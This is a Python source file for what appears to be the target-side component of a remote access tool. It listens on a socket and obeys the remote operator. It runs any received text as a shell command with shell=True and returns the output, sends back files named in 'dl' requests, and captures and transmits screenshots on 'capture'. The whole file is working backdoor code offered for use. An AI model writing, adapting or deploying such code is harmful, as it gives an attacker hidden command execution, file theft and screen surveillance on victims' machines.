from base import *
from PIL import ImageGrab
import subprocess
from spliter import commande_spliter


class Target(ServerSocket):
    def __init__(self):
        super().__init__()

    def run(self):
        while True:
            commande = self.recv_header_data(show_progress=False).decode(encoding=ENCODING)
            splited_commande = commande_spliter(commande)

            if not commande:
                break

            elif commande.lower() == 'exit':
                break

            elif commande.lower() == 'os':
                result = platform.platform() + '\n'

            elif commande.lower() == 'info':
                result = os.getcwd()

            elif splited_commande[0] == 'cd':
                try:
                    os.chdir(splited_commande[1])
                    result = os.getcwd() + '\n'
                except FileNotFoundError as err:
                    result = colored_error(str(err))
                    print(result)

            elif splited_commande[0] == 'dl':
                try:
                    with open(splited_commande[1], 'rb') as f:
                        result = f.read()
                except FileNotFoundError as err:
                    print(str(err))
                    result = 'filenotfound'
                except IsADirectoryError as err:
                    print(str(err))
                    result = 'isdir'

            elif splited_commande[0] == 'capture':
                try:
                    image = ImageGrab.grab()
                    image.save(splited_commande[1], 'png')
                    with open(splited_commande[1], 'rb') as img:
                        result = img.read()
                except OSError as err:
                    print(str(err))
                    result = 'screenshot-error'

            else:
                output = subprocess.run(commande, shell=True, universal_newlines=True, capture_output=True)
                if output.stdout is None:
                    result = colored_error(f'❗ Erreur!')
                elif output.stdout == '':
                    result = colored_error(output.stderr)
                else:
                    result = output.stdout

            if commande.lower() != 'info':
                print(f'{CYAN} ⌨️   > {commande}')

            if not result:
                self.send_header_data(colored_error(f'❗ Erreur!').encode())
            else:
                if isinstance(result, str):
                    result = result.encode(encoding=ENCODING)
                self.send_header_data(result)

        print(colored_success(f'\n‼️ Deconnecte\n'))
        self.clientsocket.close()
        self.sock.close()


if __name__ == '__main__':
    target = Target()
    target.listen()
    target.run()
